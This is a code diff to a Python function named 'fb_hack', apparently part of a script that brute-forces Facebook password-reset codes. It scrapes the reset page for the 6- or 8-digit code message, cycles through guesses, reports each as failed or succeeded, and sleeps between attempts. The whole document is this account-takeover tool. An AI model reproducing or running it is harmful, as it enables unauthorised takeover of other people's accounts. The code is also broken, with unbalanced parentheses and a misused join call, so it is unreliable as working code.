@@ -71,8 +71,9 @@ def fb_hack(email, codex):
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
   test = soup.find(string='poop')
-  check1 = soup.find(string=re.compile("6"))
-  check2 = soup.find(string=re.compile("8"))
+  check1 = soup.find(string=("Please check your email for a message with your code. Your code is 6 numbers long.")
+  """soup.find(string=re.compile("Please check your email for a message with your code. Your code is 6 numbers long."))"""
+  check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long."))
   check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   check4 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
   if check1 == "Please check your email for a message with your code. Your code is 6 numbers long.":
@@ -135,9 +136,16 @@ def fb_hack(email, codex):
         fail = (str(y), "failed")
         success = (str(y), "succeded")
         s = " "
-        print(s.join(fail, end='\r'))
-        reset1 = attempt
-        sleepy(30)
+        response1 = browser.response()
+        soup = BeautifulSoup(response1, 'html.parser')
+        check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
+        if check2 != test:
+          print(s.join(fail, end='\r'))
+          reset1 = attempt
+          sleepy(30)
+          check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
+        else:
+          sys.exit()
       except:
         response1 = browser.response()
         soup = BeautifulSoup(response1, 'html.parser')
